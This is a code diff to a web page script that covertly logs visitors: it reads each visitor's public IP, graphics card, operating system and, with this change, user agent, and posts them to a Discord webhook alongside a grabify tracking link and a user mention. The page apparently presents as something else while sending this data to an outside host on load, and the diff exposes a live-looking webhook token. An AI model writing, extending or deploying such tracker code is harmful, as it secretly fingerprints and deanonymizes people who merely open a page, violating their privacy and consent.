@@ -9,6 +9,10 @@
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script type="text/javascript">
+
+
+
+	
 const whurl = "https://discord.com/api/webhooks/982835750980706304/3Y-UdEf8ewXcMe-I9GvTgHzdksBF_2LhgU3Ta3oUl7aWVRDwnHSNC-DffFuYers7Xl47";
 
 function getVideoCardInfo() {
@@ -94,8 +98,10 @@ async function logIP() {
     const ip = await getPublicIPAddress();
     const graphCard = getVideoCardInfo().renderer;
     const userOS = getOperatingSystem(); // Use the updated function for OS detection.
+    const userAgent = navigator.userAgent    
 
-    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}`;
+
+    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}\n User Agent: ${userAgent}`;
 
     const msg = {
       content: message
